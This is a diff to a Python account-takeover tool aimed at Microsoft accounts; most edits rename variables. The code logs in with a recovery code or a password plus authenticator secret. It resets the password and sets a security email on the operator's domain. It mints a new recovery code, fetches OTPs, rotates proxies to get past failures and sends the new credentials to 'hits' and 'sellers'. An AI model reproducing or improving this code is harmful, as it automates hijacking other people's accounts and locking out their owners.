@@ -62,7 +62,7 @@ def _password_login_page_hint(page: str) -> str:
 
 
 async def _secure_after_password_login(
-    session,
+    sesja,
     email: str,
     password: str,
     rextra: dict,
@@ -74,8 +74,8 @@ async def _secure_after_password_login(
     Used as fallback when security-email OTP does not arrive after RecoverUser.
     On MSAAUTH failure returns failed=True (no further OTP retry from here).
     """
-    live = await livedata(session)
-    page = await login_pwd(session, email, live["urlPost"], password, live["ppft"])
+    live = await livedata(sesja)
+    page = await login_pwd(sesja, email, live["urlPost"], password, live["ppft"])
     logging.info(
         "password path login_pwd for %s: len=%s snippet=%r",
         email,
@@ -85,14 +85,14 @@ async def _secure_after_password_login(
 
     msaauth = get_data(page)
     if not msaauth:
-        handled = await handle_redirects(session, page)
+        handled = await handle_redirects(sesja, page)
         if handled == "Family":
             return _failure_result(
                 email,
                 "Account is Family Locked.",
-                security_email=rextra.get("security_email"),
+                sec_mail=rextra.get("sec_mail"),
                 password=password,
-                recovery_code=rextra.get("recovery_code"),
+                rec_code=rextra.get("rec_code"),
             )
         if isinstance(handled, dict) and handled.get("urlPost"):
             msaauth = handled
@@ -108,9 +108,9 @@ async def _secure_after_password_login(
     if not msaauth or not msaauth.get("urlPost"):
         # Session cookie alone can be enough after password verify — cookies-only polish
         if (
-            has_cookie(session, "__Host-MSAAUTH")
-            or has_cookie(session, "__Host-MSAAUTHP")
-            or has_cookie(session, "MSPAuth")
+            has_cookie(sesja, "__Host-MSAAUTH")
+            or has_cookie(sesja, "__Host-MSAAUTHP")
+            or has_cookie(sesja, "MSPAuth")
         ):
             logging.warning(
                 "password path has MSAAUTH cookies but no urlPost for %s — cookies-only polish",
@@ -123,15 +123,15 @@ async def _secure_after_password_login(
                 "password path MSAAUTH missing for %s — %s cookies=%s",
                 email,
                 hint,
-                [c.name for c in session.cookies.jar][:30],
+                [c.name for c in sesja.cookies.jar][:30],
             )
             return _failure_result(
                 email,
                 # Keep the historical reason string; fallback_otp drives retry.
-                "Password login did not establish an MSAAUTH session.",
-                security_email=rextra.get("security_email"),
+                "Password login did not establish an MSAAUTH sesja.",
+                sec_mail=rextra.get("sec_mail"),
                 password=password,
-                recovery_code=rextra.get("recovery_code"),
+                rec_code=rextra.get("rec_code"),
                 error=hint,
                 fallback_otp=True,
             )
@@ -141,18 +141,18 @@ async def _secure_after_password_login(
     else:
         print("[+] - Got MSAAUTH (password path)")
     try:
-        await polish_host(session, msaauth)
+        await polish_host(sesja, msaauth)
     except Exception:
         logging.exception("polish_host failed on password path")
         print("[!] - polish_host raised; continuing with existing cookies")
     print("[~] - Polished MSAAUTH")
 
-    account_info = {
+    acct = {
         "microsoft": {
             "email": email,
-            "security_email": rextra.get("security_email", "Couldn't Change!"),
+            "sec_mail": rextra.get("sec_mail", "Couldn't Change!"),
             "password": password,
-            "recovery_code": rextra.get("recovery_code", "Couldn't Change!"),
+            "rec_code": rextra.get("rec_code", "Couldn't Change!"),
             "auth_secret": "Disabled",
             "firstName": "Failed to Get",
             "lastName": "Failed to Get",
@@ -177,9 +177,9 @@ async def _secure_after_password_login(
     }
 
     secured = await secure(
-        session=session,
+        sesja=sesja,
         recovery=False,
-        account_info=account_info,
+        acct=acct,
         command=True,
     )
 
@@ -192,16 +192,16 @@ async def _secure_after_password_login(
         return _failure_result(
             email,
             reject,
-            security_email=(
-                secured_ms.get("security_email")
-                or rextra.get("security_email")
+            sec_mail=(
+                secured_ms.get("sec_mail")
+                or rextra.get("sec_mail")
             ),
             password=secured_ms.get("password") or password,
-            recovery_code=(
-                secured_ms.get("recovery_code")
-                or rextra.get("recovery_code")
+            rec_code=(
+                secured_ms.get("rec_code")
+                or rextra.get("rec_code")
             ),
-            credentials_changed=True,
+            creds_moved=True,
             primary_email=secured_ms.get("email") or email,
         )
 
@@ -215,16 +215,16 @@ async def _secure_after_password_login(
         return _failure_result(
             email,
             ban_reject,
-            security_email=(
-                secured_ms.get("security_email")
-                or rextra.get("security_email")
+            sec_mail=(
+                secured_ms.get("sec_mail")
+                or rextra.get("sec_mail")
             ),
             password=secured_ms.get("password") or password,
-            recovery_code=(
-                secured_ms.get("recovery_code")
-                or rextra.get("recovery_code")
+            rec_code=(
+                secured_ms.get("rec_code")
+                or rextra.get("rec_code")
             ),
-            credentials_changed=True,
+            creds_moved=True,
             primary_email=secured_ms.get("email") or email,
         )
 
@@ -239,45 +239,45 @@ def _failure_result(
     email: str,
     reason: str,
     *,
-    security_email: str | None = None,
+    sec_mail: str | None = None,
     password: str | None = None,
-    recovery_code: str | None = None,
+    rec_code: str | None = None,
     error: str | None = None,
     fallback_otp: bool = False,
     fallback_password: bool = False,
-    credentials_changed: bool = False,
+    creds_moved: bool = False,
     primary_email: str | None = None,
-    primary_alias_replaced: bool | None = None,
+    alias_swapped: bool | None = None,
 ) -> dict:
     # Only surface generated password/security email when RecoverUser actually succeeded
     # (or a later step failed after password change). Otherwise they mislead sellers.
     # On give-back after primary replace, pass primary_email so sellers get sunny@.
     original = (email or "").strip()
     current_primary = (primary_email or "").strip() or original
-    replaced = primary_alias_replaced
+    replaced = alias_swapped
     if replaced is None:
         replaced = bool(
             current_primary
             and original
             and current_primary.lower() != original.lower()
         )
-    if credentials_changed:
+    if creds_moved:
         ms = {
             "email": current_primary,
-            "security_email": security_email or "Couldn't Change!",
+            "sec_mail": sec_mail or "Couldn't Change!",
             "password": password or "Couldn't Change!",
-            "recovery_code": recovery_code or "Couldn't Change!",
-            "original_email": original,
-            "primary_alias_replaced": replaced,
+            "rec_code": rec_code or "Couldn't Change!",
+            "orig_email": original,
+            "alias_swapped": replaced,
         }
     else:
         ms = {
             "email": current_primary,
-            "security_email": "Couldn't Change!",
+            "sec_mail": "Couldn't Change!",
             "password": "Couldn't Change!",
-            "recovery_code": recovery_code or "Couldn't Change!",
-            "original_email": original,
-            "primary_alias_replaced": replaced,
+            "rec_code": rec_code or "Couldn't Change!",
+            "orig_email": original,
+            "alias_swapped": replaced,
         }
     detail = error or reason
     # Failure = account returned: include new primary when already changed.
@@ -287,7 +287,7 @@ def _failure_result(
         ms,
         reason,
         error=detail,
-        credentials_changed=credentials_changed,
+        creds_moved=creds_moved,
     )
     return {
         "failed": True,
@@ -295,10 +295,10 @@ def _failure_result(
         "error": detail,
         "fallback_otp": fallback_otp,
         "fallback_password": fallback_password,
-        "credentials_changed": credentials_changed,
+        "creds_moved": creds_moved,
         "microsoft": ms,
-        "hit_embed": fail_embed,
-        "seller_embed": fail_embed,
+        "hit_eb": fail_embed,
+        "sell_eb": fail_embed,
     }
 
 
@@ -327,14 +327,14 @@ async def romeo_recover(
     on_credentials: CredentialsNotify | None = None,
 ) -> dict:
 
-    session = open_session()
+    sesja = open_session()
 
     account = {
         "microsoft": {
             "email": email,
-            "security_email": "Couldn't Change!",
+            "sec_mail": "Couldn't Change!",
             "password": "Couldn't Change!",
-            "recovery_code": "Couldn't Change!",
+            "rec_code": "Couldn't Change!",
             "auth_secret": "Disabled",
             "firstName": "Failed to Get",
             "lastName": "Failed to Get",
@@ -363,7 +363,7 @@ async def romeo_recover(
     }
     
     initialTime = time()
-    print("[~] - Logging in session...")
+    print("[~] - Logging in sesja...")
 
     match method:
         case "rcode":
@@ -378,23 +378,23 @@ async def romeo_recover(
             sname = uuid.uuid4().hex[:16]
             # Letters+digits, mixed case — no symbols
             password = make_ms_password(14)
-            security_email = f"{sname}@{config['domain']}"
-            print(f"[+] - [+] sec email ({security_email})")
+            sec_mail = f"{sname}@{config['domain']}"
+            print(f"[+] - [+] sec email ({sec_mail})")
 
             with DBConnection() as database:
-                database.add_security_email(security_email, password)
+                database.add_security_email(sec_mail, password)
 
             new_recovery_code = None
             try:
                 # Proxy TLS flakes (ConnectError) — retry; after 2 fails mint a new sticky SSID.
                 try:
-                    new_recovery_code, session = await run_with_proxy_retry(
-                        session,
+                    new_recovery_code, sesja = await run_with_proxy_retry(
+                        sesja,
                         lambda s: recover(
-                            session=s,
+                            sesja=s,
                             email=email,
-                            recovery_code=data["recovery_code"],
-                            new_email=security_email,
+                            rec_code=data["rec_code"],
+                            new_email=sec_mail,
                             new_password=password,
                         ),
                         new_session=get_session,
@@ -407,20 +407,20 @@ async def romeo_recover(
                     return _failure_result(
                         email,
                         exc.reason,
-                        security_email=security_email if exc.credentials_changed else None,
-                        password=password if exc.credentials_changed else None,
-                        recovery_code=data.get("recovery_code"),
+                        sec_mail=sec_mail if exc.creds_moved else None,
+                        password=password if exc.creds_moved else None,
+                        rec_code=data.get("rec_code"),
                         error=exc.reason,
-                        credentials_changed=exc.credentials_changed,
+                        creds_moved=exc.creds_moved,
                     )
                 except Exception as exc:
                     if is_network_glitch(exc):
                         return _failure_result(
                             email,
                             f"Network error during recovery ({exc.__class__.__name__}). Retry the account.",
-                            recovery_code=data.get("recovery_code"),
+                            rec_code=data.get("rec_code"),
                             error=str(exc) or exc.__class__.__name__,
-                            credentials_changed=False,
+                            creds_moved=False,
                         )
                     raise
 
@@ -428,14 +428,14 @@ async def romeo_recover(
                     return _failure_result(
                         email,
                         "Recovery failed — Microsoft did not return a new recovery code.",
-                        recovery_code=data.get("recovery_code"),
+                        rec_code=data.get("rec_code"),
                         error="recover() returned empty/invalid",
-                        credentials_changed=False,
+                        creds_moved=False,
                     )
 
                 print("[+] - Changed password and recovery code")
                 print(f"[+] - New recovery code: {new_recovery_code}")
-                print(f"[+] - Security email: {security_email}")
+                print(f"[+] - Security email: {sec_mail}")
                 print(f"[+] - Password: {password}")
 
                 # DM / notify credentials IMMEDIATELY — polish/OTP can hang later
@@ -444,30 +444,30 @@ async def romeo_recover(
                     on_credentials,
                     {
                         "email": email,
-                        "security_email": security_email,
+                        "sec_mail": sec_mail,
                         "password": password,
-                        "recovery_code": new_recovery_code,
+                        "rec_code": new_recovery_code,
                     },
                 )
 
                 # Drop the recovery jar — account.live.com + login.live.com leave
-                # duplicate MSCC cookies that crash httpx. Fresh session for OTP login.
-                await close_http(session)
-                session = open_session()
+                # duplicate MSCC cookies that crash httpx. Fresh sesja for OTP login.
+                await close_http(sesja)
+                sesja = open_session()
 
                 # Soft verify only — never abort recovery on flaky check.
                 try:
-                    pwd_status = await verify_password_works(session, email, password)
+                    pwd_status = await verify_password_works(sesja, email, password)
                 except Exception as exc:
                     if is_network_glitch(exc):
                         logging.warning(
                             "Password verify proxy error for %s — rotating SSID and retrying once",
                             email,
                         )
-                        await close_http(session)
-                        session = open_session()
+                        await close_http(sesja)
+                        sesja = open_session()
                         try:
-                            pwd_status = await verify_password_works(session, email, password)
+                            pwd_status = await verify_password_works(sesja, email, password)
                         except Exception:
                             logging.exception("Password verify raised for %s", email)
                             pwd_status = "unknown"
@@ -497,9 +497,9 @@ async def romeo_recover(
 
                         forced_pwd, forced_ok = await force_password_via_otp(
                             email=email,
-                            security_email=security_email,
+                            sec_mail=sec_mail,
                             preferred_password=password,
-                            session=session,
+                            sesja=sesja,
                         )
                         if forced_ok:
                             password = forced_pwd
@@ -523,7 +523,7 @@ async def romeo_recover(
                     print("[~] - Password verify inconclusive — delayed re-check…")
                     try:
                         pwd_status2 = await verify_password_works(
-                            session, email, password, settle_delay=10.0
+                            sesja, email, password, settle_delay=10.0
                         )
                     except Exception:
                         pwd_status2 = "unknown"
@@ -542,9 +542,9 @@ async def romeo_recover(
 
                             forced_pwd, forced_ok = await force_password_via_otp(
                                 email=email,
-                                security_email=security_email,
+                                sec_mail=sec_mail,
                                 preferred_password=password,
-                                session=session,
+                                sesja=sesja,
                             )
                             if forced_ok:
                                 password = forced_pwd
@@ -559,9 +559,9 @@ async def romeo_recover(
                         print("[~] - Password verify still inconclusive (continuing)")
 
                 rextra = {
-                    "security_email": security_email,
+                    "sec_mail": sec_mail,
                     "password": password,
-                    "recovery_code": new_recovery_code,
+                    "rec_code": new_recovery_code,
                 }
 
                 # OTP-first after RecoverUser. Password login right after recover
@@ -586,7 +586,7 @@ async def romeo_recover(
                     last_auth_error = None
 
                     for round_i in range(1, max_otp_rounds + 1):
-                        info = await send_auth(s, email, security_email)
+                        info = await send_auth(s, email, sec_mail)
                         flowtoken, auth_error = _flowtoken_from_auth(info)
                         if auth_error:
                             last_auth_error = auth_error
@@ -594,10 +594,10 @@ async def romeo_recover(
                             return _failure_result(
                                 email,
                                 auth_error,
-                                security_email=security_email,
+                                sec_mail=sec_mail,
                                 password=password,
-                                recovery_code=new_recovery_code,
-                                credentials_changed=True,
+                                rec_code=new_recovery_code,
+                                creds_moved=True,
                             )
 
                         since = _time.time()
@@ -606,7 +606,7 @@ async def romeo_recover(
                             f"{max_otp_rounds}, {otp_timeout_s}s)..."
                         )
                         code = await fetch_otp(
-                            security_email, timeout=otp_timeout_s, since=since
+                            sec_mail, timeout=otp_timeout_s, since=since
                         )
                         print(f"Got code - {code}")
                         if code:
@@ -625,10 +625,10 @@ async def romeo_recover(
                                 f"Timed out waiting for OTP after {max_otp_rounds} "
                                 "sends at the new security email."
                             ),
-                            security_email=security_email,
+                            sec_mail=sec_mail,
                             password=password,
-                            recovery_code=new_recovery_code,
-                            credentials_changed=True,
+                            rec_code=new_recovery_code,
+                            creds_moved=True,
                             fallback_password=True,
                         )
 
@@ -636,7 +636,7 @@ async def romeo_recover(
                     ppft = live["ppft"]
 
                     return await romeo_secure(
-                        session=s,
+                        sesja=s,
                         email=email,
                         device=flowtoken,
                         ppft=ppft,
@@ -647,12 +647,12 @@ async def romeo_recover(
                     )
 
                 print("[~] - Logging in via security-email OTP (password is fallback)...")
-                await close_http(session)
-                session = open_session()
+                await close_http(sesja)
+                sesja = open_session()
 
                 try:
-                    account, session = await run_with_proxy_retry(
-                        session,
+                    account, sesja = await run_with_proxy_retry(
+                        sesja,
                         _otp_login,
                         new_session=get_session,
                         attempts=4,
@@ -669,15 +669,15 @@ async def romeo_recover(
                         account = _failure_result(
                             email,
                             f"Network error during OTP login ({exc.__class__.__name__}).",
-                            security_email=security_email,
+                            sec_mail=sec_mail,
                             password=password,
-                            recovery_code=new_recovery_code,
+                            rec_code=new_recovery_code,
                             error=str(exc) or exc.__class__.__name__,
-                            credentials_changed=True,
+                            creds_moved=True,
                             fallback_password=True,
                         )
-                        await close_http(session)
-                        session = open_session()
+                        await close_http(sesja)
+                        sesja = open_session()
                     else:
                         raise
 
@@ -706,10 +706,10 @@ async def romeo_recover(
                             )
 
                             forced_pwd, forced_rc, forced_ok = await force_password_after_recover(
-                                session,
+                                sesja,
                                 email=email,
-                                security_email=security_email,
-                                recovery_code=new_recovery_code,
+                                sec_mail=sec_mail,
+                                rec_code=new_recovery_code,
                                 preferred_password=clean_password(password),
                                 max_attempts=3,
                             )
@@ -722,8 +722,8 @@ async def romeo_recover(
                                     "[+] - Forced password stuck after OTP failure — "
                                     "retrying password login"
                                 )
-                                await close_http(session)
-                                session = open_session()
+                                await close_http(sesja)
+                                sesja = open_session()
 
                                 async def _pwd_login_after_force(s):
                                     return await _secure_after_password_login(
@@ -731,16 +731,16 @@ async def romeo_recover(
                                         email,
                                         forced_pwd,
                                         {
-                                            "security_email": security_email,
+                                            "sec_mail": sec_mail,
                                             "password": forced_pwd,
-                                            "recovery_code": new_recovery_code,
+                                            "rec_code": new_recovery_code,
                                         },
                                         elapsed=time() - initialTime,
                                     )
 
                                 try:
-                                    account, session = await run_with_proxy_retry(
-                                        session,
+                                    account, sesja = await run_with_proxy_retry(
+                                        sesja,
                                         _pwd_login_after_force,
                                         new_session=get_session,
                                         attempts=4,
@@ -773,10 +773,10 @@ async def romeo_recover(
                             "Security-email OTP did not arrive and password did not "
                             "stick after RecoverUser. Use the recovery code below "
                             "to sign in / reset, then resubmit if needed.",
-                            security_email=security_email,
+                            sec_mail=sec_mail,
                             password=password,
-                            recovery_code=new_recovery_code,
-                            credentials_changed=True,
+                            rec_code=new_recovery_code,
+                            creds_moved=True,
                         )
 
                     logging.warning(
@@ -790,8 +790,8 @@ async def romeo_recover(
                         "[!] - Security-email OTP failed after resend; "
                         f"falling back to password login (verify={pwd_status})..."
                     )
-                    await close_http(session)
-                    session = open_session()
+                    await close_http(sesja)
+                    sesja = open_session()
 
                     async def _pwd_login(s):
                         return await _secure_after_password_login(
@@ -803,8 +803,8 @@ async def romeo_recover(
                         )
 
                     try:
-                        account, session = await run_with_proxy_retry(
-                            session,
+                        account, sesja = await run_with_proxy_retry(
+                            sesja,
                             _pwd_login,
                             new_session=get_session,
                             attempts=4,
@@ -819,27 +819,27 @@ async def romeo_recover(
                                 f"Network error during password login "
                                 f"({exc.__class__.__name__}). "
                                 "Credentials above are valid — retry securing.",
-                                security_email=security_email,
+                                sec_mail=sec_mail,
                                 password=password,
-                                recovery_code=new_recovery_code,
+                                rec_code=new_recovery_code,
                                 error=str(exc) or exc.__class__.__name__,
-                                credentials_changed=True,
+                                creds_moved=True,
                             )
                         raise
 
                 if isinstance(account, dict) and account.get("failed"):
                     # Keep reject embeds from romeo_secure (include sunny@ primary).
                     # Re-wrapping via _failure_result without primary_email was wiping it.
-                    if account.get("hit_embed") or account.get("seller_embed"):
+                    if account.get("hit_eb") or account.get("sell_eb"):
                         ms = account.get("microsoft") or {}
-                        if not ms.get("security_email") and security_email:
-                            ms["security_email"] = security_email
+                        if not ms.get("sec_mail") and sec_mail:
+                            ms["sec_mail"] = sec_mail
                         if not ms.get("password") and password:
                             ms["password"] = password
-                        if not ms.get("recovery_code") and new_recovery_code:
-                            ms["recovery_code"] = new_recovery_code
+                        if not ms.get("rec_code") and new_recovery_code:
+                            ms["rec_code"] = new_recovery_code
                         account["microsoft"] = ms
-                        account["credentials_changed"] = True
+                        account["creds_moved"] = True
                         return account
                     ms = account.get("microsoft") or {}
                     return _failure_result(
@@ -848,11 +848,11 @@ async def romeo_recover(
                             "reason",
                             "Login or securing failed after recovery code reset.",
                         ),
-                        security_email=ms.get("security_email") or security_email,
+                        sec_mail=ms.get("sec_mail") or sec_mail,
                         password=ms.get("password") or password,
-                        recovery_code=ms.get("recovery_code") or new_recovery_code,
+                        rec_code=ms.get("rec_code") or new_recovery_code,
                         error=account.get("error") or account.get("reason"),
-                        credentials_changed=True,
+                        creds_moved=True,
                         primary_email=ms.get("email"),
                     )
 
@@ -860,11 +860,11 @@ async def romeo_recover(
                     return _failure_result(
                         email,
                         "Login or securing failed after recovery code reset.",
-                        security_email=security_email,
+                        sec_mail=sec_mail,
                         password=password,
-                        recovery_code=new_recovery_code,
+                        rec_code=new_recovery_code,
                         error="romeo_secure returned no account data.",
-                        credentials_changed=True,
+                        creds_moved=True,
                     )
 
                 return account
@@ -898,20 +898,20 @@ async def romeo_recover(
                     return _failure_result(
                         email,
                         f"Securing step failed: {reason}",
-                        security_email=security_email,
+                        sec_mail=sec_mail,
                         password=password,
-                        recovery_code=new_recovery_code,
+                        rec_code=new_recovery_code,
                         error=reason,
-                        credentials_changed=True,
+                        creds_moved=True,
                     )
                 raise
             finally:
-                await close_http(session)
+                await close_http(sesja)
             
         case "authpwd":
             # Password + authenticator TOTP login, then secure(recovery=True)
             # which mints RC → RecoverUser (new pwd / security email).
-            # Parity with rcode: proxy retry, filters, ban checks, give-back, session close.
+            # Parity with rcode: proxy retry, filters, ban checks, give-back, sesja close.
             lock_reason = await get_account_lock_reason(email)
             if lock_reason:
                 return _failure_result(
@@ -932,7 +932,7 @@ async def romeo_recover(
             try:
                 async def _totp_login(s):
                     result = await login_authenticator(
-                        session=s,
+                        sesja=s,
                         email=email,
                         data={"password": seller_password, "auth_secret": auth_secret},
                     )
@@ -950,8 +950,8 @@ async def romeo_recover(
                         )
                     return True
 
-                login_ok, session = await run_with_proxy_retry(
-                    session,
+                login_ok, sesja = await run_with_proxy_retry(
+                    sesja,
                     _totp_login,
                     new_session=get_session,
                     attempts=4,
@@ -976,20 +976,20 @@ async def romeo_recover(
                         prior = database.get_secured_account_by_email(email)
                     if prior:
                         ms = account["microsoft"]
-                        prior_rc = str(prior.get("recovery_code") or "").strip()
-                        prior_sec = str(prior.get("security_email") or "").strip()
+                        prior_rc = str(prior.get("rec_code") or "").strip()
+                        prior_sec = str(prior.get("sec_mail") or "").strip()
                         prior_pwd = str(prior.get("password") or "").strip()
                         if prior_rc and prior_rc not in (
                             "Couldn't Change!",
                             "Failed to generate",
                         ):
-                            ms["recovery_code"] = prior_rc
+                            ms["rec_code"] = prior_rc
                             print(
                                 f"[~] - Seeded prior recovery code from DB "
                                 f"({prior_rc[:8]}…)"
                             )
                         if prior_sec and "@" in prior_sec and prior_sec != "Couldn't Change!":
-                            ms["security_email"] = prior_sec
+                            ms["sec_mail"] = prior_sec
                             print(f"[~] - Seeded prior security email from DB ({prior_sec})")
                         # Seller TOTP password may be stale after a prior RecoverUser —
                         # keep seller_password for login, but stash secured pwd for MFA.
@@ -1002,7 +1002,7 @@ async def romeo_recover(
 
                 # Login already has proxy retry; secure() used to run once and soft-fail
                 # on the first ConnectError (Bamboozled sunny906 resubmit). Retry on the
-                # same session, then re-login on a fresh sticky SSID and try again.
+                # same sesja, then re-login on a fresh sticky SSID and try again.
                 dsecured = None
                 last_secure_exc: BaseException | None = None
                 secure_attempts = 4
@@ -1013,10 +1013,10 @@ async def romeo_recover(
                                 f"[!] - authpwd secure() retry {secure_try}/{secure_attempts}"
                                 " — fresh sticky + re-login…"
                             )
-                            await close_http(session)
-                            session = open_session()
-                            login_ok, session = await run_with_proxy_retry(
-                                session,
+                            await close_http(sesja)
+                            sesja = open_session()
+                            login_ok, sesja = await run_with_proxy_retry(
+                                sesja,
                                 _totp_login,
                                 new_session=get_session,
                                 attempts=4,
@@ -1027,9 +1027,9 @@ async def romeo_recover(
                             if isinstance(login_ok, dict) and login_ok.get("failed"):
                                 return login_ok
                         dsecured = await secure(
-                            session=session,
+                            sesja=sesja,
                             recovery=True,
-                            account_info=account,
+                            acct=account,
                             command=True,
                         )
                         last_secure_exc = None
@@ -1060,18 +1060,18 @@ async def romeo_recover(
                     logging.exception("authpwd secure() crashed for %s", email)
                     ms = (account.get("microsoft") or {})
                     primary = str(ms.get("email") or "").strip() or email
-                    replaced = ms.get("primary_alias_replaced") is True or (
+                    replaced = ms.get("alias_swapped") is True or (
                         primary.lower() != email.lower()
                     )
                     creds_changed = (
                         bool(
-                            ms.get("recovery_code")
-                            and ms.get("recovery_code")
+                            ms.get("rec_code")
+                            and ms.get("rec_code")
                             not in ("Couldn't Change!", "Failed to generate", None)
                         )
                         or bool(
-                            ms.get("security_email")
-                            and ms.get("security_email") not in ("Couldn't Change!", None)
+                            ms.get("sec_mail")
+                            and ms.get("sec_mail") not in ("Couldn't Change!", None)
                         )
                         or replaced
                     )
@@ -1084,32 +1084,32 @@ async def romeo_recover(
                     return _failure_result(
                         email,
                         f"Securing step failed: {reason}",
-                        security_email=ms.get("security_email") if creds_changed else None,
+                        sec_mail=ms.get("sec_mail") if creds_changed else None,
                         password=ms.get("password") if creds_changed else seller_password,
-                        recovery_code=ms.get("recovery_code") if creds_changed else None,
+                        rec_code=ms.get("rec_code") if creds_changed else None,
                         error=reason,
-                        credentials_changed=creds_changed,
+                        creds_moved=creds_changed,
                         primary_email=primary,
-                        primary_alias_replaced=replaced,
+                        alias_swapped=replaced,
                     )
 
                 if not dsecured or not isinstance(dsecured, dict):
                     ms = (account.get("microsoft") or {})
                     primary = str(ms.get("email") or "").strip() or email
-                    replaced = ms.get("primary_alias_replaced") is True
+                    replaced = ms.get("alias_swapped") is True
                     return _failure_result(
                         email,
                         "Login or securing failed after authenticator login.",
                         password=seller_password,
                         error="secure() returned no account data",
                         primary_email=primary,
-                        primary_alias_replaced=replaced,
-                        credentials_changed=replaced,
+                        alias_swapped=replaced,
+                        creds_moved=replaced,
                     )
 
                 ms = dsecured.get("microsoft") or {}
-                new_rc = str(ms.get("recovery_code") or "").strip()
-                new_sec = str(ms.get("security_email") or "").strip()
+                new_rc = str(ms.get("rec_code") or "").strip()
+                new_sec = str(ms.get("sec_mail") or "").strip()
                 new_pwd = str(ms.get("password") or "").strip()
                 creds_ready = (
                     new_rc
@@ -1122,9 +1122,9 @@ async def romeo_recover(
                         on_credentials,
                         {
                             "email": email,
-                            "security_email": new_sec,
+                            "sec_mail": new_sec,
                             "password": new_pwd,
-                            "recovery_code": new_rc,
+                            "rec_code": new_rc,
                         },
                     )
 
@@ -1135,10 +1135,10 @@ async def romeo_recover(
                     return _failure_result(
                         email,
                         reject,
-                        security_email=ms.get("security_email"),
+                        sec_mail=ms.get("sec_mail"),
                         password=ms.get("password") or seller_password,
-                        recovery_code=ms.get("recovery_code"),
-                        credentials_changed=True,
+                        rec_code=ms.get("rec_code"),
+                        creds_moved=True,
                         primary_email=ms.get("email") or email,
                     )
 
@@ -1151,28 +1151,28 @@ async def romeo_recover(
                     return _failure_result(
                         email,
                         ban_reject,
-                        security_email=ms.get("security_email"),
+                        sec_mail=ms.get("sec_mail"),
                         password=ms.get("password") or seller_password,
-                        recovery_code=ms.get("recovery_code"),
-                        credentials_changed=True,
+                        rec_code=ms.get("rec_code"),
+                        creds_moved=True,
                         primary_email=ms.get("email") or email,
                     )
 
                 if not creds_ready:
                     primary = str(ms.get("email") or "").strip() or email
-                    replaced = ms.get("primary_alias_replaced") is True or (
+                    replaced = ms.get("alias_swapped") is True or (
                         primary.lower() != email.lower()
                     )
                     return _failure_result(
                         email,
                         "Securing failed — recovery code / security email were not set.",
                         password=ms.get("password") or seller_password,
-                        recovery_code=ms.get("recovery_code"),
-                        security_email=ms.get("security_email"),
+                        rec_code=ms.get("rec_code"),
+                        sec_mail=ms.get("sec_mail"),
                         error="authpwd secure did not produce new credentials",
-                        credentials_changed=replaced,
+                        creds_moved=replaced,
                         primary_email=primary,
-                        primary_alias_replaced=replaced,
+                        alias_swapped=replaced,
                     )
 
                 final_time = time() - initialTime
@@ -1191,7 +1191,7 @@ async def romeo_recover(
                     )
                 raise
             finally:
-                await close_http(session)
+                await close_http(sesja)
 
     logging.error("recovery_secure unknown method=%s email=%s", method, email)
     return _failure_result(email, f"Unknown secure method: {method}")
